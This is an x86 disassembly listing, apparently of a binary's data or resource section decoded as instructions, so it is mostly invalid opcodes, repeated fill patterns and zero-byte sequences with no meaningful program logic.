11015a4c:	or     al,0x7
11015a4e:	add    al,0xff
11015a50:	imul   ebp,DWORD PTR [ecx+0x69],0xfbfbfbff
11015a57:	(bad)  
11015a58:	(bad)  
11015a59:	(bad)  
11015a5a:	(bad)  
11015a5b:	(bad)  
11015a5c:	(bad)  
11015a5d:	(bad)  
11015a5e:	(bad)  
11015a5f:	(bad)  
11015a60:	sti    
11015a61:	fmul   st(6),st
11015a63:	(bad)  
11015a64:	stc    
11015a65:	retf   0xffb4
11015a68:	cli    
11015a69:	rol    edx,cl
11015a6b:	(bad)  
11015a6c:	cli    
11015a6d:	(bad)  
11015a6e:	(bad)  
11015a71:	sar    BYTE PTR [esi-0x4f390601],1
11015a77:	(bad)  
11015a78:	clc    
11015a79:	mov    ebx,0xaff7ff9f
11015a7e:	(bad)  
11015a7f:	push   esi
11015a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11015a82:	cmp    edi,0xff759df5
11015a88:	hlt    
11015a89:	xchg   edi,eax
11015a8a:	ins    DWORD PTR es:[edi],dx
11015a8b:	push   esp
11015a8d:	xchg   ebx,eax
11015a8e:	push   sp
11015a91:	(bad)  
11015a92:	(bad)  
11015a93:	push   ebx
11015a95:	lea    ebx,[esi-0x1]
11015a98:	repnz mov bl,BYTE PTR [ebx-0x1]
11015a9c:	idiv   DWORD PTR [edx+eiz*4-0x1010101]
11015aa3:	(bad)  
11015aa4:	(bad)  
11015aa5:	(bad)  
11015aa6:	(bad)  
11015aa7:	(bad)  
11015aa8:	sti    
11015aa9:	sti    
11015aaa:	sti    
11015aab:	jmp    FWORD PTR [eax+0x68]
11015aae:	push   0x5070dff
11015ab3:	push   DWORD PTR [edx+0x40]
11015ab6:	sub    bh,bh
11015ab8:	add    BYTE PTR [eax],al
11015aba:	add    bh,bh
11015abc:	add    BYTE PTR [eax],al
11015abe:	add    BYTE PTR [eax+0x6c000000],bh
11015ac4:	add    BYTE PTR [eax],al
11015ac6:	add    BYTE PTR [edx],ch
11015ac8:	add    BYTE PTR [eax],al
11015aca:	add    BYTE PTR [edx],cl
11015acc:	add    BYTE PTR [eax],al
11015ace:	add    BYTE PTR [ecx],al
	...
11015adc:	add    BYTE PTR [eax],al
11015ade:	add    BYTE PTR [ebx],al
11015ae0:	add    BYTE PTR [eax],al
11015ae2:	add    BYTE PTR [esi],dl
11015ae4:	add    BYTE PTR [eax],al
11015ae6:	add    bh,bh
11015ae8:	scas   al,BYTE PTR es:[edi]
11015ae9:	bound  eax,QWORD PTR [eax-0x1]
11015aec:	test   eax,0xcff3e5f
11015af1:	pop    es
11015af2:	add    al,0xff
11015af4:	push   0xfcff6868
11015af9:	cld    
11015afa:	cld    
11015afb:	(bad)  
11015afc:	(bad)  
11015afd:	(bad)  
11015afe:	(bad)  
11015aff:	(bad)  
11015b00:	std    
11015b01:	std    
11015b02:	cld    
11015b03:	(bad)  
11015b04:	sti    
11015b05:	fmul   st(5),st
11015b07:	(bad)  
11015b08:	stc    
11015b09:	les    ebp,FWORD PTR [ebp-0x4e380601]
11015b0f:	(bad)  
11015b10:	stc    
11015b11:	lds    ebp,FWORD PTR [esi-0x5c410701]
11015b17:	push   edi
11015b19:	mov    ah,0x96
11015b1b:	push   esi
11015b1d:	stos   DWORD PTR es:[edi],eax
11015b1e:	mov    bh,bh
11015b20:	mul    BYTE PTR [edx-0x650a0084]
11015b26:	jb     0x11015b27
11015b28:	hlt    
11015b29:	xchg   ebp,eax
11015b2a:	imul   edi,edi,0xff6491f4
11015b30:	hlt    
11015b31:	mov    fs,WORD PTR [eax-0x1]
11015b34:	repz mov WORD PTR [esi-0x1],ds
11015b38:	stc    
11015b39:	mov    esi,0xfcfdffa4
11015b3e:	cld    
11015b3f:	(bad)  
11015b40:	(bad)  
11015b41:	(bad)  
11015b42:	(bad)  
11015b43:	(bad)  
11015b44:	cld    
11015b45:	cld    
11015b46:	sti    
11015b47:	jmp    DWORD PTR [edi+0x67]
11015b4a:	dec    DWORD PTR [di]
11015b4d:	pop    es
11015b4e:	add    eax,0x3f60aaff
11015b53:	jmp    FWORD PTR [esi+0xff4062]
11015b59:	add    BYTE PTR [eax],al
11015b5b:	inc    DWORD PTR [eax]
11015b5d:	add    BYTE PTR [eax],al
11015b5f:	mov    eax,0x6c000000
11015b64:	add    BYTE PTR [eax],al
11015b66:	add    BYTE PTR [edx],ch
11015b68:	add    BYTE PTR [eax],al
11015b6a:	add    BYTE PTR [edx],cl
11015b6c:	add    BYTE PTR [eax],al
11015b6e:	add    BYTE PTR [ecx],al
	...
11015b7c:	add    BYTE PTR [eax],al
11015b7e:	add    BYTE PTR [ebx],al
11015b80:	add    BYTE PTR [eax],al
11015b82:	add    BYTE PTR [esi],dl
11015b84:	add    BYTE PTR [eax],al
11015b86:	add    bh,bh
11015b88:	mov    ch,0x66
11015b8a:	inc    ebx
11015b8b:	(bad)  
11015b8c:	jmp    0xbb00b315
11015b91:	pop    edi
11015b92:	dec    DWORD PTR ds:0x69ff0407
11015b99:	imul   ebp,DWORD PTR [ecx-0x1],0xfffbfbfb
11015ba0:	(bad)  
11015ba1:	(bad)  
11015ba2:	std    
11015ba3:	(bad)  
11015ba4:	(bad)  
11015ba5:	(bad)  
11015ba6:	(bad)  
11015ba7:	(bad)  
11015ba8:	cld    
11015ba9:	call   0xd1fb5b8d
11015bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11015baf:	push   edi
11015bb1:	mov    ch,0x97
11015bb3:	push   edi
11015bb5:	mov    al,0x90
11015bb7:	push   esi
11015bb9:	stos   BYTE PTR es:[edi],al
11015bba:	xchg   edi,edi
11015bbc:	cmc    
11015bbd:	mov    ds:0x9cf5ff7d,eax
11015bc2:	je     0x11015bc3
11015bc4:	hlt    
11015bc5:	xchg   esi,eax
11015bc6:	imul   edi,edi,0xfffffff4
11015bc9:	xchg   ecx,eax
11015bca:	gs push ebx
11015bcd:	mov    fs,WORD PTR [eax-0x1]
11015bd0:	cmc    
11015bd1:	fwait
11015bd2:	jae    0x11015bd3
11015bd4:	sti    
11015bd5:	fcmove st,st(2)
11015bd7:	(bad)  
11015bd8:	(bad)  
11015bd9:	(bad)  
11015bda:	std    
11015bdb:	(bad)  
11015bdc:	(bad)  
11015bdd:	(bad)  
11015bde:	(bad)  
11015bdf:	(bad)  
11015be0:	sti    
11015be1:	sti    
11015be2:	sti    
11015be3:	jmp    FWORD PTR [eax+0x68]
11015be6:	push   0x5070dff
11015beb:	jmp    FWORD PTR [edx-0x1600c0a0]
11015bf1:	test   BYTE PTR [edi-0x1],dl
11015bf4:	mov    ch,0x66
11015bf6:	inc    ebx
11015bf7:	inc    DWORD PTR [eax]
11015bf9:	add    BYTE PTR [eax],al
11015bfb:	inc    DWORD PTR [eax]
11015bfd:	add    BYTE PTR [eax],al
11015bff:	mov    eax,0x6c000000
11015c04:	add    BYTE PTR [eax],al
11015c06:	add    BYTE PTR [edx],ch
11015c08:	add    BYTE PTR [eax],al
11015c0a:	add    BYTE PTR [edx],cl
11015c0c:	add    BYTE PTR [eax],al
11015c0e:	add    BYTE PTR [ecx],al
	...
11015c1c:	add    BYTE PTR [eax],al
11015c1e:	add    BYTE PTR [ebx],al
11015c20:	add    BYTE PTR [eax],al
11015c22:	add    BYTE PTR [esi],dl
11015c24:	add    BYTE PTR [eax],al
11015c26:	add    bh,bh
11015c28:	mov    dh,0x67
11015c2a:	inc    esp
11015c2b:	push   ecx
11015c2d:	mov    BYTE PTR [edx-0x1],bl
11015c30:	jmp    0xbb00b3b9
11015c35:	pop    edi
11015c36:	dec    DWORD PTR ds:[edi+eax*1]
11015c3a:	add    al,0xff
11015c3c:	imul   ebp,DWORD PTR [ecx+0x69],0xfcfcfcff
11015c43:	(bad)  
11015c44:	(bad)  
11015c45:	(bad)  
11015c46:	(bad)  
11015c47:	(bad)  
11015c48:	(bad)  
11015c49:	(bad)  
11015c4a:	(bad)  
11015c4b:	(bad)  
11015c4c:	(bad)  
11015c4d:	sti    
11015c4e:	cli    
11015c4f:	(bad)  
11015c50:	cld    
11015c51:	loop   0x11015c29
11015c53:	(bad)  
11015c54:	stc    
11015c55:	les    ebp,FWORD PTR [edi+edi*8-0x735109]
11015c5c:	neg    BYTE PTR [edi-0x640a0088]
11015c62:	jb     0x11015c63
11015c64:	mul    BYTE PTR [edx-0x49070084]
11015c6a:	cwde   
11015c6b:	(bad)  
11015c6c:	sti    
11015c6d:	fmul   st,st(0)
11015c6f:	(bad)  
11015c70:	std    
11015c71:	cli    
11015c72:	stc    
11015c73:	(bad)  
11015c74:	(bad)  
11015c75:	(bad)  
11015c76:	std    
11015c77:	(bad)  
11015c78:	std    
11015c79:	std    
11015c7a:	std    
11015c7b:	(bad)  
11015c7c:	cld    
11015c7d:	cld    
11015c7e:	cld    
11015c7f:	jmp    FWORD PTR [eax+0x68]
11015c82:	push   0x4070cff
11015c87:	jmp    FWORD PTR [edx-0x1600c0a0]
11015c8d:	adc    DWORD PTR [edi-0x1],0xfffffff1
11015c91:	mov    BYTE PTR [edx-0x1],bl
11015c94:	mov    dh,0x67
11015c96:	inc    esp
11015c97:	inc    DWORD PTR [eax]
11015c99:	add    BYTE PTR [eax],al
11015c9b:	inc    DWORD PTR [eax]
11015c9d:	add    BYTE PTR [eax],al
11015c9f:	mov    eax,0x6c000000
11015ca4:	add    BYTE PTR [eax],al
11015ca6:	add    BYTE PTR [edx],ch
11015ca8:	add    BYTE PTR [eax],al
11015caa:	add    BYTE PTR [edx],cl
11015cac:	add    BYTE PTR [eax],al
11015cae:	add    BYTE PTR [ecx],al
	...
11015cbc:	add    BYTE PTR [eax],al
11015cbe:	add    BYTE PTR [ebx],al
11015cc0:	add    BYTE PTR [eax],al
11015cc2:	add    BYTE PTR [esi],dl
11015cc4:	add    BYTE PTR [eax],al
11015cc6:	add    bh,bh
11015cc8:	mov    bh,0x67
11015cca:	inc    esp
11015ccb:	push   ebx
11015ccd:	mov    DWORD PTR [edx-0x1],ebx
11015cd0:	icebp  
11015cd1:	mov    BYTE PTR [edx-0x1],bl
11015cd4:	jmp    0x3e5f:0xa9ff5784
11015cdb:	dec    DWORD PTR ds:0x68ff0407
11015ce1:	push   0xfbfbff68
11015ce6:	sti    
11015ce7:	(bad)  
11015ce8:	(bad)  
11015ce9:	(bad)  
11015cea:	std    
11015ceb:	(bad)  
11015cec:	std    
11015ced:	std    
11015cee:	std    
11015cef:	(bad)  
11015cf0:	(bad)  
11015cf1:	(bad)  
11015cf2:	std    
11015cf3:	(bad)  
11015cf4:	(bad)  
11015cf5:	(bad)  
11015cf6:	std    
11015cf7:	(bad)  
11015cf8:	std    
11015cf9:	std    
11015cfa:	std    
11015cfb:	(bad)  
11015cfc:	(bad)  
11015cfd:	(bad)  
11015cfe:	std    
11015cff:	(bad)  
11015d00:	std    
11015d01:	std    
11015d02:	std    
11015d03:	(bad)  
11015d04:	(bad)  
11015d05:	(bad)  
11015d06:	(bad)  
11015d07:	(bad)  
11015d08:	(bad)  
11015d09:	(bad)  
11015d0a:	(bad)  
11015d0b:	(bad)  
11015d0c:	(bad)  
11015d0d:	(bad)  
11015d0e:	(bad)  
11015d0f:	(bad)  
11015d10:	std    
11015d11:	std    
11015d12:	std    
11015d13:	(bad)  
11015d14:	(bad)  
11015d15:	(bad)  
11015d16:	std    
11015d17:	(bad)  
11015d18:	sti    
11015d19:	sti    
11015d1a:	sti    
11015d1b:	jmp    DWORD PTR [edi+0x67]
11015d1e:	dec    DWORD PTR [di]
11015d21:	pop    es
11015d22:	add    al,0xff
11015d24:	stos   BYTE PTR es:[edi],al
11015d25:	pusha  
11015d26:	aas    
11015d27:	(bad)  
11015d28:	jmp    0x5a88:0xf1ff5784
11015d2f:	push   ebx
11015d31:	mov    DWORD PTR [edx-0x1],ebx
11015d34:	mov    bh,0x67
11015d36:	inc    esp
11015d37:	inc    DWORD PTR [eax]
11015d39:	add    BYTE PTR [eax],al
11015d3b:	inc    DWORD PTR [eax]
11015d3d:	add    BYTE PTR [eax],al
11015d3f:	mov    bh,0x0
11015d41:	add    BYTE PTR [eax],al
11015d43:	imul   eax,DWORD PTR [eax],0x0
11015d46:	add    BYTE PTR [edx],ch
11015d48:	add    BYTE PTR [eax],al
11015d4a:	add    BYTE PTR [edx],cl
11015d4c:	add    BYTE PTR [eax],al
11015d4e:	add    BYTE PTR [ecx],al
	...
11015d5c:	add    BYTE PTR [eax],al
11015d5e:	add    BYTE PTR [ebx],al
11015d60:	add    BYTE PTR [eax],al
11015d62:	add    BYTE PTR ds:0xff000000,dl
11015d68:	mov    bh,0x67
11015d6a:	inc    esp
11015d6b:	push   esp
11015d6d:	mov    bl,BYTE PTR [ebx-0x1]
11015d70:	xrelease mov DWORD PTR [ebx-0x1],ebx
11015d74:	icebp  
11015d75:	mov    BYTE PTR [edx-0x1],bl
11015d78:	jmp    0xbb00b501
11015d7d:	pop    edi
11015d7e:	dec    DWORD PTR ds:[edi+eax*1]
11015d82:	add    al,0xff
11015d84:	imul   ebp,DWORD PTR [ecx+0x69],0xfbfbfbff
11015d8b:	(bad)  
11015d8c:	std    
11015d8d:	std    
11015d8e:	std    
11015d8f:	(bad)  
11015d90:	(bad)  
11015d91:	(bad)  
11015d92:	(bad)  
11015d93:	(bad)  
11015d94:	(bad)  
11015d95:	(bad)  
11015d96:	std    
11015d97:	(bad)  
11015d98:	(bad)  
11015d99:	(bad)  
11015d9a:	std    
11015d9b:	(bad)  
11015d9c:	(bad)  
11015d9d:	(bad)  
11015d9e:	(bad)  
11015d9f:	(bad)  
11015da0:	(bad)  
11015da1:	(bad)  
11015da2:	std    
11015da3:	(bad)  
11015da4:	(bad)  
11015da5:	(bad)  
11015da6:	(bad)  
11015da7:	(bad)  
11015da8:	(bad)  
11015da9:	(bad)  
11015daa:	(bad)  
11015dab:	(bad)  
11015dac:	(bad)  
11015dad:	(bad)  
11015dae:	(bad)  
11015daf:	(bad)  
11015db0:	std    
11015db1:	std    
11015db2:	std    
11015db3:	(bad)  
11015db4:	sti    
11015db5:	sti    
11015db6:	sti    
11015db7:	jmp    FWORD PTR [eax+0x68]
11015dba:	push   0x4070dff
11015dbf:	jmp    FWORD PTR [edx-0x1600c0a0]
11015dc5:	adc    DWORD PTR [edi-0x1],0xfffffff1
11015dc9:	mov    BYTE PTR [edx-0x1],bl
11015dcc:	xrelease mov DWORD PTR [edx-0x1],ebx
11015dd0:	xrelease mov DWORD PTR [edx-0x1],ebx
11015dd4:	mov    bh,0x67
11015dd6:	inc    esp
11015dd7:	inc    DWORD PTR [eax]
11015dd9:	add    BYTE PTR [eax],al
11015ddb:	inc    DWORD PTR [eax]
11015ddd:	add    BYTE PTR [eax],al
11015ddf:	mov    cl,0x0
11015de1:	add    BYTE PTR [eax],al
11015de3:	push   0x28000000
11015de8:	add    BYTE PTR [eax],al
11015dea:	add    BYTE PTR [ecx],cl
11015dec:	add    BYTE PTR [eax],al
11015dee:	add    BYTE PTR [ecx],al
	...
11015dfc:	add    BYTE PTR [eax],al
11015dfe:	add    BYTE PTR [ebx],al
11015e00:	add    BYTE PTR [eax],al
11015e02:	add    BYTE PTR [edx],dl
11015e04:	add    BYTE PTR [eax],al
11015e06:	add    bh,bh
11015e08:	mov    bh,0x67
11015e0a:	inc    esp
11015e0b:	push   esp
11015e0d:	mov    bl,BYTE PTR [ebx-0x1]
11015e10:	hlt    
11015e11:	mov    bl,BYTE PTR [ebx-0x1]
11015e14:	xrelease mov DWORD PTR [edx-0x1],ebx
11015e18:	icebp  
11015e19:	mov    BYTE PTR [edx-0x1],bl
11015e1c:	jmp    0xbb00b5a5
11015e21:	pop    edi
11015e22:	dec    DWORD PTR ds:[edi+eax*1]
11015e26:	add    al,0xff
11015e28:	push   0xfcff6868
11015e2d:	cld    
11015e2e:	cld    
11015e2f:	(bad)  
11015e30:	(bad)  
11015e31:	(bad)  
11015e32:	std    
11015e33:	(bad)  
11015e34:	(bad)  
11015e35:	(bad)  
11015e36:	(bad)  
11015e37:	(bad)  
11015e38:	(bad)  
11015e39:	(bad)  
11015e3a:	std    
11015e3b:	(bad)  
11015e3c:	(bad)  
11015e3d:	(bad)  
11015e3e:	(bad)  
11015e3f:	(bad)  
11015e40:	std    
11015e41:	std    
11015e42:	std    
11015e43:	(bad)  
11015e44:	(bad)  
11015e45:	(bad)  
11015e46:	(bad)  
11015e47:	(bad)  
11015e48:	(bad)  
11015e49:	(bad)  
11015e4a:	(bad)  
11015e4b:	(bad)  
11015e4c:	(bad)  
11015e4d:	(bad)  
11015e4e:	(bad)  
11015e4f:	(bad)  
11015e50:	sti    
11015e51:	sti    
11015e52:	sti    
11015e53:	jmp    DWORD PTR [edi+0x67]
11015e56:	dec    DWORD PTR [di]
11015e59:	pop    es
11015e5a:	add    al,0xff
11015e5c:	stos   BYTE PTR es:[edi],al
11015e5d:	pusha  
11015e5e:	aas    
11015e5f:	(bad)  
11015e60:	jmp    0x300b5e9
11015e65:	mov    BYTE PTR [edx-0x1],bl
11015e68:	xrelease mov DWORD PTR [edx-0x1],ebx
11015e6c:	xrelease mov DWORD PTR [edx-0x1],ebx
11015e70:	xrelease mov DWORD PTR [edx-0x1],ebx
11015e74:	mov    bh,0x67
11015e76:	inc    esp
11015e77:	inc    DWORD PTR [eax]
11015e79:	add    BYTE PTR [eax],al
11015e7b:	inc    DWORD PTR [eax]
11015e7d:	add    BYTE PTR [eax],al
11015e7f:	call   0x0:0x5a000000
11015e86:	add    BYTE PTR [ebx],ah
11015e88:	add    BYTE PTR [eax],al
11015e8a:	add    BYTE PTR [eax],cl
11015e8c:	add    BYTE PTR [eax],al
11015e8e:	add    BYTE PTR [ecx],al
	...
11015e9c:	add    BYTE PTR [eax],al
11015e9e:	add    BYTE PTR [edx],al
11015ea0:	add    BYTE PTR [eax],al
11015ea2:	add    BYTE PTR ds:0xff000000,cl
11015ea8:	mov    DWORD PTR [ebp+0x33],ecx
11015eab:	push   DWORD PTR [edi-0x4800bb99]
11015eb1:	addr16 inc esp
11015eb3:	push   DWORD PTR [edi-0x4900bb99]
11015eb9:	addr16 inc esp
11015ebb:	push   DWORD PTR [ebp-0x5100bc9a]
11015ec1:	bound  eax,QWORD PTR [eax-0x1]
11015ec4:	jno    0x11015f05
11015ec6:	sub    edi,edi
11015ec8:	add    DWORD PTR [eax],eax
11015eca:	add    bh,bh
11015ecc:	imul   ebp,DWORD PTR [ecx+0x69],0xfbfbfbff
11015ed3:	(bad)  
11015ed4:	(bad)  
11015ed5:	(bad)  
11015ed6:	std    
11015ed7:	(bad)  
11015ed8:	std    
11015ed9:	std    
11015eda:	std    
11015edb:	(bad)  
11015edc:	(bad)  
11015edd:	(bad)  
11015ede:	std    
11015edf:	(bad)  
11015ee0:	std    
11015ee1:	std    
11015ee2:	std    
11015ee3:	(bad)  
11015ee4:	(bad)  
11015ee5:	(bad)  
11015ee6:	(bad)  
11015ee7:	(bad)  
11015ee8:	(bad)  
11015ee9:	(bad)  
11015eea:	std    
11015eeb:	(bad)  
11015eec:	sti    
11015eed:	sti    
11015eee:	sti    
11015eef:	jmp    FWORD PTR [eax+0x68]
11015ef2:	push   0x1ff
11015ef7:	push   DWORD PTR [edx+0x40]
11015efa:	sub    bh,bh
11015efc:	scas   al,BYTE PTR es:[edi]
11015efd:	bound  eax,QWORD PTR [eax-0x1]
11015f00:	mov    ch,0x66
11015f02:	inc    ebx
11015f03:	push   DWORD PTR [esi-0x4900bb99]
11015f09:	addr16 inc esp
11015f0b:	push   DWORD PTR [esi-0x4900bb99]
11015f11:	addr16 inc esp
11015f13:	dec    DWORD PTR [ecx+0xff334d]
11015f19:	add    BYTE PTR [eax],al
11015f1b:	inc    DWORD PTR [eax]
11015f1d:	add    BYTE PTR [eax],al
11015f1f:	push   0x0
11015f21:	add    BYTE PTR [eax],al
11015f23:	add    BYTE PTR ds:[eax],al
11015f26:	add    BYTE PTR [eax],bl
11015f28:	add    BYTE PTR [eax],al
11015f2a:	add    BYTE PTR [esi],al
	...
11015f3c:	add    BYTE PTR [eax],al
11015f3e:	add    BYTE PTR [ecx],al
11015f40:	add    BYTE PTR [eax],al
11015f42:	add    BYTE PTR [esi],al
11015f44:	add    BYTE PTR [eax],al
11015f46:	add    bh,bh
11015f48:	add    BYTE PTR [eax],al
11015f4a:	add    bh,bh
11015f4c:	add    BYTE PTR [eax],al
11015f4e:	add    bh,bh
11015f50:	add    BYTE PTR [eax],al
11015f52:	add    bh,bh
11015f54:	add    BYTE PTR [eax],al
11015f56:	add    bh,bh
11015f58:	add    BYTE PTR [eax],al
11015f5a:	add    bh,bh
11015f5c:	add    BYTE PTR [eax],al
11015f5e:	add    bh,bh
11015f60:	add    BYTE PTR [eax],al
11015f62:	add    bh,bh
11015f64:	add    BYTE PTR [eax],al
11015f66:	add    bh,bh
11015f68:	add    BYTE PTR [eax],al
11015f6a:	add    bh,bh
11015f6c:	add    BYTE PTR [eax],al
11015f6e:	add    bh,bh
11015f70:	imul   ebp,DWORD PTR [ecx+0x69],0xfcfcfcff
11015f77:	(bad)  
11015f78:	std    
11015f79:	std    
11015f7a:	std    
11015f7b:	(bad)  
11015f7c:	(bad)  
11015f7d:	(bad)  
11015f7e:	(bad)  
11015f7f:	(bad)  
11015f80:	std    
11015f81:	std    
11015f82:	std    
11015f83:	(bad)  
11015f84:	(bad)  
11015f85:	(bad)  
11015f86:	(bad)  
11015f87:	(bad)  
11015f88:	sti    
11015f89:	sti    
11015f8a:	sti    
11015f8b:	jmp    FWORD PTR [eax+0x68]
11015f8e:	push   0xff
11015f93:	inc    DWORD PTR [eax]
11015f95:	add    BYTE PTR [eax],al
11015f97:	inc    DWORD PTR [eax]
11015f99:	add    BYTE PTR [eax],al
11015f9b:	inc    DWORD PTR [eax]
11015f9d:	add    BYTE PTR [eax],al
11015f9f:	inc    DWORD PTR [eax]
11015fa1:	add    BYTE PTR [eax],al
11015fa3:	inc    DWORD PTR [eax]
11015fa5:	add    BYTE PTR [eax],al
11015fa7:	inc    DWORD PTR [eax]
11015fa9:	add    BYTE PTR [eax],al
11015fab:	inc    DWORD PTR [eax]
11015fad:	add    BYTE PTR [eax],al
11015faf:	inc    DWORD PTR [eax]
11015fb1:	add    BYTE PTR [eax],al
11015fb3:	inc    DWORD PTR [eax]
11015fb5:	add    BYTE PTR [eax],al
11015fb7:	inc    DWORD PTR [eax]
11015fb9:	add    BYTE PTR [eax],al
11015fbb:	inc    DWORD PTR [eax]
11015fbd:	add    BYTE PTR [eax],al
11015fbf:	xor    eax,DWORD PTR [eax]
11015fc1:	add    BYTE PTR [eax],al
11015fc3:	push   ds
11015fc4:	add    BYTE PTR [eax],al
11015fc6:	add    BYTE PTR [eax+eax*1],cl
11015fc9:	add    BYTE PTR [eax],al
11015fcb:	add    eax,DWORD PTR [eax]
	...
11015fe1:	add    BYTE PTR [eax],al
11015fe3:	add    al,BYTE PTR [eax]
11015fe5:	add    BYTE PTR [eax],al
11015fe7:	push   es
11015fe8:	add    BYTE PTR [eax],al
11015fea:	add    BYTE PTR ds:0x12000000,cl
11015ff0:	add    BYTE PTR [eax],al
11015ff2:	add    BYTE PTR ds:0x16000000,dl
11015ff8:	add    BYTE PTR [eax],al
11015ffa:	add    BYTE PTR [esi],dl
11015ffc:	add    BYTE PTR [eax],al
11015ffe:	add    BYTE PTR [esi],dl
11016000:	add    BYTE PTR [eax],al
11016002:	add    BYTE PTR [esi],dl
11016004:	add    BYTE PTR [eax],al
11016006:	add    BYTE PTR [edi],dl
11016008:	add    BYTE PTR [eax],al
1101600a:	add    BYTE PTR [edi],bl
1101600c:	add    BYTE PTR [eax],al
1101600e:	add    BYTE PTR [edx+0x0],bl
11016011:	add    BYTE PTR [eax],al
11016013:	icebp  
11016014:	push   0xfbfe6868
11016019:	sti    
1101601a:	sti    
1101601b:	(bad)  
1101601c:	(bad)  
1101601d:	(bad)  
1101601e:	(bad)  
1101601f:	(bad)  
11016020:	std    
11016021:	std    
11016022:	std    
11016023:	(bad)  
11016024:	sti    
11016025:	sti    
11016026:	sti    
11016027:	jmp    DWORD PTR [edi+0x67]
1101602a:	inc    BYTE PTR [bx+si]
1101602d:	add    BYTE PTR [eax],al
1101602f:	icebp  
11016030:	add    BYTE PTR [eax],al
11016032:	add    BYTE PTR [ecx+0x0],bl
11016035:	add    BYTE PTR [eax],al
11016037:	pop    ds
11016038:	add    BYTE PTR [eax],al
1101603a:	add    BYTE PTR [edi],dl
1101603c:	add    BYTE PTR [eax],al
1101603e:	add    BYTE PTR [esi],dl
11016040:	add    BYTE PTR [eax],al
11016042:	add    BYTE PTR [esi],dl
11016044:	add    BYTE PTR [eax],al
11016046:	add    BYTE PTR [esi],dl
11016048:	add    BYTE PTR [eax],al
1101604a:	add    BYTE PTR [esi],dl
1101604c:	add    BYTE PTR [eax],al
1101604e:	add    BYTE PTR [esi],dl
11016050:	add    BYTE PTR [eax],al
11016052:	add    BYTE PTR [esi],dl
11016054:	add    BYTE PTR [eax],al
11016056:	add    BYTE PTR ds:0x14000000,dl
1101605c:	add    BYTE PTR [eax],al
1101605e:	add    BYTE PTR [eax],dl
11016060:	add    BYTE PTR [eax],al
11016062:	add    BYTE PTR [ecx],cl
11016064:	add    BYTE PTR [eax],al
11016066:	add    BYTE PTR [ebx],al
11016068:	add    BYTE PTR [eax],al
1101606a:	add    BYTE PTR [ecx],al
	...
11016084:	add    BYTE PTR [eax],al
11016086:	add    BYTE PTR [ecx],al
11016088:	add    BYTE PTR [eax],al
1101608a:	add    BYTE PTR [edx],al
1101608c:	add    BYTE PTR [eax],al
1101608e:	add    BYTE PTR [ebx],al
11016090:	add    BYTE PTR [eax],al
11016092:	add    BYTE PTR [ebx],al
11016094:	add    BYTE PTR [eax],al
11016096:	add    BYTE PTR [ebx],al
11016098:	add    BYTE PTR [eax],al
1101609a:	add    BYTE PTR [ebx],al
1101609c:	add    BYTE PTR [eax],al
1101609e:	add    BYTE PTR [ebx],al
110160a0:	add    BYTE PTR [eax],al
110160a2:	add    BYTE PTR [ebx],al
110160a4:	add    BYTE PTR [eax],al
110160a6:	add    BYTE PTR [ebx],al
110160a8:	add    BYTE PTR [eax],al
110160aa:	add    BYTE PTR ds:0xe000000,al
110160b0:	add    BYTE PTR [eax],al
110160b2:	add    BYTE PTR [eax+0x0],dl
110160b5:	add    BYTE PTR [eax],al
110160b7:	icebp  
110160b8:	imul   ebp,DWORD PTR [ecx+0x69],0xfbfbfbfe
110160bf:	(bad)  
110160c0:	sti    
110160c1:	sti    
110160c2:	sti    
110160c3:	jmp    FWORD PTR [eax+0x68]
110160c6:	push   0xfe
110160cb:	lock add BYTE PTR [eax],al
110160ce:	add    BYTE PTR [edi+0x0],cl
110160d1:	add    BYTE PTR [eax],al
110160d3:	push   cs
110160d4:	add    BYTE PTR [eax],al
110160d6:	add    BYTE PTR ds:0x3000000,al
110160dc:	add    BYTE PTR [eax],al
110160de:	add    BYTE PTR [ebx],al
110160e0:	add    BYTE PTR [eax],al
110160e2:	add    BYTE PTR [ebx],al
110160e4:	add    BYTE PTR [eax],al
110160e6:	add    BYTE PTR [ebx],al
110160e8:	add    BYTE PTR [eax],al
110160ea:	add    BYTE PTR [ebx],al
110160ec:	add    BYTE PTR [eax],al
110160ee:	add    BYTE PTR [ebx],al
110160f0:	add    BYTE PTR [eax],al
110160f2:	add    BYTE PTR [ebx],al
110160f4:	add    BYTE PTR [eax],al
110160f6:	add    BYTE PTR [ebx],al
110160f8:	add    BYTE PTR [eax],al
110160fa:	add    BYTE PTR [ebx],al
110160fc:	add    BYTE PTR [eax],al
110160fe:	add    BYTE PTR [edx],al
11016100:	add    BYTE PTR [eax],al
11016102:	add    BYTE PTR [ecx],al
	...
1101614c:	add    BYTE PTR [eax],al
1101614e:	add    BYTE PTR [edx],al
11016150:	add    BYTE PTR [eax],al
11016152:	add    BYTE PTR [edx],cl
11016154:	add    BYTE PTR [eax],al
11016156:	add    BYTE PTR [ebp+0x0],cl
11016159:	add    BYTE PTR [eax],al
1101615b:	icebp  
1101615c:	push   0x67fe6868
11016161:	addr16 inc BYTE PTR [bx+si]
11016165:	add    BYTE PTR [eax],al
11016167:	lock add BYTE PTR [eax],al
1101616a:	add    BYTE PTR [ebx+0x0],cl
1101616d:	add    BYTE PTR [eax],al
1101616f:	or     al,BYTE PTR [eax]
11016171:	add    BYTE PTR [eax],al
11016173:	add    al,BYTE PTR [eax]
	...
110161f1:	add    BYTE PTR [eax],al
110161f3:	add    al,BYTE PTR [eax]
110161f5:	add    BYTE PTR [eax],al
110161f7:	or     DWORD PTR [eax],eax
110161f9:	add    BYTE PTR [eax],al
110161fb:	dec    eax
110161fc:	add    BYTE PTR [eax],al
110161fe:	add    al,dh
11016200:	add    BYTE PTR [eax],al
11016202:	add    bh,ch
11016204:	add    BYTE PTR [eax],al
11016206:	add    BYTE PTR [esi+0x0],al
11016209:	add    BYTE PTR [eax],al
1101620b:	or     DWORD PTR [eax],eax
1101620d:	add    BYTE PTR [eax],al
1101620f:	add    al,BYTE PTR [eax]
	...
11016295:	add    BYTE PTR [eax],al
11016297:	add    DWORD PTR [eax],eax
11016299:	add    BYTE PTR [eax],al
1101629b:	add    eax,0x3f000000
110162a0:	add    BYTE PTR [eax],al
110162a2:	add    BYTE PTR ds:0x5000000,bh
110162a8:	add    BYTE PTR [eax],al
110162aa:	add    BYTE PTR [ecx],al
	...
110162f0:	inc    BYTE PTR [eax]
110162f2:	add    BYTE PTR [eax],al
110162f4:	ud0    eax,DWORD PTR [eax]
110162f7:	push   cs
110162f8:	lock add BYTE PTR [eax],al
110162fb:	add    BYTE PTR [ebx],al
110162fd:	inc    DWORD PTR [eax]
110162ff:	push   cs
